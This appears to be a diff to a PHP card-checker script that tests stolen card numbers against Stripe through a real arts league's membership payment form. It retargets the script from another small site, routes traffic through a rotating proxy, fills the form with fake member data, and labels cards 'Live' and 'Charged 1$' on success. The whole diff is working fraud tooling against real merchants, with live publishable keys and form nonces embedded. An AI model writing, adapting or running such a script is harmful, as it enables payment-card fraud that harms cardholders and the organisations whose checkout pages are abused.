@@ -82,7 +82,7 @@ curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
 
 # ----------------- [1req Postfields] ---------------------#
 
-curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&card[number]='.$cc.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=da0023d5-49ac-4f4e-985e-b64fba270f665432e7&muid=7087376c-dbb2-4568-834b-165223143665764379&sid=96468abf-e91c-44c2-80af-76573840b91188be16&pasted_fields=number&payment_user_agent=stripe.js%2F65b2ba26d0%3B+stripe-js-v3%2F65b2ba26d0%3B+card-element&referrer=https%3A%2F%2Flimitlessflowposing.com&time_on_page=146002&key=pk_live_51MyCQkKq1yP3KvSUU0Gf5ydVtq6MPmZiORQgOAyblzRlS9QGoX0QBsu5qyhd3IXy3UPtNILNmkIwbvpRkpUukcFS00W0Sy8AJG');
+curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&card[number]='.$cc.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=da0023d5-49ac-4f4e-985e-b64fba270f665432e7&muid=8c6bf9e6-557a-4268-bc09-b2ef7999768c48ddc2&sid=d92ed724-72b1-4cba-968c-87e97a786ef253ff00&pasted_fields=number&payment_user_agent=stripe.js%2F327b5a4b1f%3B+stripe-js-v3%2F327b5a4b1f%3B+card-element&referrer=https%3A%2F%2Fnewingtonartleague.org&time_on_page=63239&key=pk_live_51N1BqMENV3HnJRUGrRed9iXcWt4ylaaVROlP7XCIZWnJgNDuotNu2SFa6yHr1QhtadMuzE4ayhrfuwVH5MBmZXaF00ZEc2M4qJ');
 
 $result1 = curl_exec($ch);
 $id = trim(strip_tags(getStr($result1,'"id": "','"')));
@@ -95,7 +95,7 @@ $PROXYSCRAPE_PORT = 6060;
 $PROXYSCRAPE_HOSTNAME = 'rp.proxyscrape.com';
 
 $ch = curl_init();
-curl_setopt($ch, CURLOPT_URL, 'https://limitlessflowposing.com/wp-admin/admin-ajax.php?t=1712882764062');
+curl_setopt($ch, CURLOPT_URL, 'https://newingtonartleague.org/wp-admin/admin-ajax.php?t=1713097252637');
 curl_setopt($ch, CURLOPT_HEADER, 0);
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
 curl_setopt($ch, CURLOPT_PROXYPORT, $PROXYSCRAPE_PORT);
@@ -110,22 +110,22 @@ curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
 curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
 curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
     curl_setopt($ch, CURLOPT_HTTPHEADER, array(
-'POST /wp-admin/admin-ajax.php?t=1712882764062 h2',
-'Host: limitlessflowposing.com',
+'POST /wp-admin/admin-ajax.php?t=1713097252637 h2',
+'Host: newingtonartleague.org',
 'accept: */*',
 'content-type: application/x-www-form-urlencoded; charset=UTF-8',
 'user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
-'origin: https://limitlessflowposing.com',
+'origin: https://newingtonartleague.org',
 'sec-fetch-site: same-origin',
 'sec-fetch-mode: cors',
 'sec-fetch-dest: empty',
-'referer: https://limitlessflowposing.com/community-membership-site/',
+'referer: https://newingtonartleague.org/membership/',
 'accept-language: en-US,en;q=0.9',
    ));
 
 # ----------------- [2req Postfields] ---------------------#
 
-curl_setopt($ch, CURLOPT_POSTFIELDS,'data=__fluent_form_embded_post_id%3D2714%26_fluentform_15_fluentformnonce%3De39aa6cba5%26_wp_http_referer%3D%252Fcommunity-membership-site%252F%26name%255Bfirst_name%255D%3DGloosmoke%26email%3D'.$id.'%2540gmail.com%26phone%3D%252B66817480671%26input_text_2%3Dgaungyellhtet%26input_text_3%3DGoogle%26input_text_4%3DNY%26input_text%3DNY%26input_text_5%3DNY%26input_text_6%3DNY%26input_text_7%3DNY%26input_text_8%3DNY%26input_text_9%3DNY%26input_text_10%3DNY%26payment_input%3D0%26payment-coupon%3D%26payment_method%3Dstripe%26__ff_all_applied_coupons%3D%26__entry_intermediate_hash%3Df44e0152a81928537d060eb2542a8216%26__stripe_payment_method_id%3D'.$id.'&action=fluentform_submit&form_id=15');
+curl_setopt($ch, CURLOPT_POSTFIELDS,'data=__fluent_form_embded_post_id%3D13%26_fluentform_3_fluentformnonce%3D2530a3c122%26_wp_http_referer%3D%252Fmembership%252F%26payment_input_1%3DStudent%2520(age%252016%2520and%2520up)%2520(%252410)%26input_radio%3DNew%2520Member%26names%255Bfirst_name%255D%3DGloo%26names%255Blast_name%255D%3DSmoke%26address_1%255Baddress_line_1%255D%3DStreet%252027%26address_1%255Baddress_line_2%255D%3D%26address_1%255Bcity%255D%3DNew%2520York%26address_1%255Bstate%255D%3DNY%26address_1%255Bzip%255D%3D10014%26email%3Dgloosmoke%2540gmail.com%26input_mask%3D%26dropdown%3D%26payment_method%3Dstripe%26__entry_intermediate_hash%3D09239c080a1549f1aba8fa7d0f7da21e%26__stripe_payment_method_id%3D'.$id.'&action=fluentform_submit&form_id=3');
 
 $result2a = curl_exec($ch);
 
@@ -197,7 +197,7 @@ $response = "Expired Card 🚫";
   }
 
 
-elseif (strpos($result2a, 'redirectUrl')){
+elseif (strpos($result2a, 'Thank you for joining!')){
   $status = "Live 🟢";
 $response = "Charged 1$ ✅";
 
